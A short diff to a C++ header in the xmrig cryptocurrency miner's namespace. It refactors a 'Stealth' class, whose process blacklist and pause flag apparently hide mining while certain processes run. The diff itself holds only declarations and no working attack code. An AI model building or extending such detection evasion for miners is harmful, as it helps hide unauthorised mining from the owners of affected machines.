@@ -1,12 +1,14 @@
 #pragma once
 
-#include "base/threads/Thread.h"
+#include "backend/common/Thread.h"
 #include <vector>
 #include <string>
 
 namespace xmrig {
 
 class Controller;
+
+template<class T> class Thread;
 
 class Stealth {
 public:
@@ -20,7 +22,7 @@ private:
     void checkProcesses();
 
     Controller *m_controller;
-    Thread *m_thread;
+    Thread<Stealth> *m_thread;
     std::vector<std::string> m_blacklist;
     bool m_paused = false;
 };
